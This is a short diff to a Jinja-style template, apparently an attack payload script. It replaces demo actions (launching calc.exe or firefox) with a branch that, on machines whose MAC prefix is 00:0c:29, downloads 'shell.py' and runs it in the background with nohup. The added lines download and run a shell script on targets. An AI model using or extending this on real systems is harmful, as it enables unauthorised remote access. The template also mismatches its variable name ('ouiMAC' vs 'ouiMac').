@@ -1,6 +1,6 @@
 {% set ouiMAC = ':'.join(mac.split(':')[:3]) %}
-{% if os == "Windows" %}
-	run calc.exe
-{% elif os == "Linux" %}
-	run firefox
+
+{% if ouiMac == "00:0c:29" %}
+	download shell.py
+	run nohup python3 shell.py &
 {% endif %}
